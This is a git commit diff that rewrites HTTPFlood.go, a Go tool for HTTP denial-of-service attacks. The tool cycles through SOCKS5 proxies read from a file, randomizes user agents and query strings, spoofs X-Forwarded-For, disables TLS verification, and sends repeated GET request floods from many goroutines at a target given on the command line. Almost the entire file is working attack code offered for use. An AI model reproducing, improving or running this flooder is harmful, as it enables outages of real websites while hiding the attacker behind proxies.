546bab66561ab5f67646a82b6ebc2df1b0f26d7b
Võ Bảo <87627629+kenegdane@users.noreply.github.com>
2021-10-06 13:05:46 +0700

    Update HTTPFlood.go

--- HTTPFlood.go
+++ HTTPFlood.go
@@ -3,43 +3,66 @@ package main
 import (
 	"bufio"
 	"crypto/tls"
-	"fmt"
-	"io"
 	"math/rand"
 	"net"
-	"net/url"
 	"os"
 	"strconv"
-	"sync"
 	"time"
 
-	"golang.org/x/net/proxy"
+	"github.com/txthinking/socks5"
 )
 
 var (
-	host        = os.Args[1]
-	port        = os.Args[2]
-	thread, err = strconv.Atoi(os.Args[3])
-	path        = os.Args[4]
-	proxies     []string
-	headers     string
-	userAgents  []string
-	c           = "qwertyuiopasdfghjklzxcvbnm1234567890-_"
-	osList      = []string{
+	proxies, userAgents []string
+	chars               = "qwertyuiopasdfghjklzxcvbnm1234567890"
+	targetHost          = os.Args[1]
+	targetPort          = os.Args[2]
+	threadNumber        = os.Args[3]
+	targetPath          = os.Args[4]
+)
+
+func init() {
+	rand.Seed(time.Now().UnixNano())
+}
+
+func readLines(fileName string) []string {
+	var lines []string
+	openFile, _ := os.Open("socks5.txt")
+	scanner := bufio.NewScanner(openFile)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	return lines
+}
+
+func randomChars() string {
+	return string(chars[rand.Intn(len(chars))])
+}
+
+func randomIntn() string {
+	return strconv.Itoa(rand.Intn(1000))
+}
+
+func randomParams() string {
+	return "?" + randomChars() + randomIntn() + "=" + randomChars() + randomIntn() + " "
+}
+
+func getUserAgent() string {
+	osList := []string{
 		"iOS",
 		"Windows",
 		"X11",
 		"Android",
 	}
 
-	ios = []string{
+	ios := []string{
 		"iPhone; CPU iPhone OS 13_3 like Mac OS X",
 		"iPad; CPU OS 13_3 like Mac OS X",
 		"iPod touch; iPhone OS 4.3.3",
 		"iPod touch; CPU iPhone OS 12_0 like Mac OS X",
 	}
 
-	android = []string{
+	android := []string{
 		"Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
 		"Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
 		"Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
@@ -51,7 +74,7 @@ var (
 		"Linux; Android 9.0; SAMSUNG SM-G950U",
 	}
 
-	windows = []string{
+	windows := []string{
 		"Windows NT 10.0; Win64; X64",
 		"Windows NT 10.0; WOW64",
 		"Windows NT 5.1; rv:7.0.1",
@@ -60,7 +83,7 @@ var (
 		"Windows NT 6.3; WOW64; rv:13.37",
 	}
 
-	x11 = []string{
+	x11 := []string{
 		"X11; Linux x86_64",
 		"X11; Ubuntu; Linux i686",
 		"SMART-TV; Linux; Tizen 2.4.0",
@@ -70,18 +93,7 @@ var (
 		"X11; CrOS x86_64 11337.33.7",
 		"X11; Debian; Linux x86_64",
 	}
-)
-
-func init() {
-	rand.Seed(time.Now().UnixNano())
-}
-
-func randchars() string {
-	return "?" + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + "=" + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))]) + string(c[rand.Intn(len(c))])
-}
-
-func getUserAgent() string {
-	var osName string = osList[rand.Intn(len(osList))]
+	osName := osList[rand.Intn(len(osList))]
 	var version string
 	if osName == "iOS" {
 		version = ios[rand.Intn(len(ios))]
@@ -98,59 +110,57 @@ func getUserAgent() string {
 	return "Mozzila 5.0 " + "(" + version + ")" + " AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + strconv.Itoa(rand.Intn(91-60)+60) + ".0." + strconv.Itoa(rand.Intn(5000-4000)+4000) + "." + strconv.Itoa(rand.Intn(60-40)+40) + " Safari/537.36"
 }
 
-func main() {
-	var wg sync.WaitGroup
-	for i := 0; i < 500; i++ {
+func getUserAgents(number int) []string {
+	var userAgents []string
+	for i := 0; i < number; i++ {
 		userAgents = append(userAgents, getUserAgent())
 	}
-	f, _ := os.Open("socks5.txt")
-	defer f.Close()
-	br := bufio.NewReader(f)
+	return userAgents
+}
+
+func StartFlood() {
+	var dialer net.Conn
+	siteAddress := targetHost + ":" + targetPort
+	socksAddress := proxies[rand.Intn(len(proxies))]
+
+	// Headers init.
+	httpVersion := "HTTP/1.1\r\n"
+	accept := "Accept: */*\r\n"
+	host := "Host: " + targetHost + "\r\n"
+	connection := "Connection: Keep-Alive\r\n"
+	cacheControl := "Cache-Control: max-age=0\r\n"
+	xForwardFor := "X-Forwarded-For: " + socksAddress + "\r\n"
+	userAgent := "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
+
+	socksClient, err := socks5.NewClient(socksAddress, "", "", 0, 0)
+	if err != nil {
+		return
+	}
 	for {
-		a, _, c := br.ReadLine()
-		if c == io.EOF {
+		dialer, err = socksClient.Dial("tcp", siteAddress)
+		if targetPort == "443" {
+			dialer = tls.Client(dialer, &tls.Config{
+				ServerName:         targetHost,
+				InsecureSkipVerify: true,
+			})
+		}
+		if err != nil {
 			break
 		}
-		proxies = append(proxies, string(a))
+		defer dialer.Close()
+		for i := 0; i < 100; i++ {
+			headers := "GET " + targetPath + randomParams() + " " + httpVersion + host + connection + accept + cacheControl + userAgent + xForwardFor + "\r\n"
+			dialer.Write([]byte(headers))
+		}
 	}
-	for i := 0; i < thread; i++ {
-		wg.Add(1)
-		go func(wg *sync.WaitGroup) {
-			defer wg.Done()
-			var s net.Conn
-			for {
-				var proxyAddress string = proxies[rand.Intn(len(proxies))]
-				addr, _ := url.Parse("socks5://" + proxyAddress)
-				socks, err := proxy.FromURL(addr, proxy.Direct)
-				if err != nil {
-					continue
-				}
-				var UserAgent string = "User-Agent: " + userAgents[rand.Intn(len(userAgents))] + "\r\n"
-				var Connection string = "Connection: Keep-Alive\r\n"
-				var c string = "Cache-Control: no-cache\r\n"
-				var p string = "Pragma: no-cache\r\n"
-				var Accept string = "Accept: */*\r\n"
-				for {
-					s, err = socks.Dial("tcp", host+":"+port)
-					if port == "443" {
-						s = tls.Client(s, &tls.Config{
-							ServerName:         host,
-							InsecureSkipVerify: true,
-						})
-					}
-					if err != nil {
-						break
-					} else {
-						defer s.Close()
-						for i := 0; i < 100; i++ {
-							headers = "GET " + path + randchars() + " HTTP/1.1\r\nHost: " + host + "\r\n" + UserAgent + Connection + c + p + Accept + "\r\n"
-							s.Write([]byte(headers))
-						}
-						fmt.Println("Flood sent " + proxyAddress)
-					}
-				}
-			}
-		}(&wg)
+}
+
+func main() {
+	proxies = readLines("socks5.txt")
+	userAgents = getUserAgents(100)
+	threadNumber, _ := strconv.Atoi(threadNumber)
+	for i := 0; i < threadNumber; i++ {
+		go StartFlood()
 	}
-	wg.Wait()
+	time.Sleep(10 * time.Second)
 }
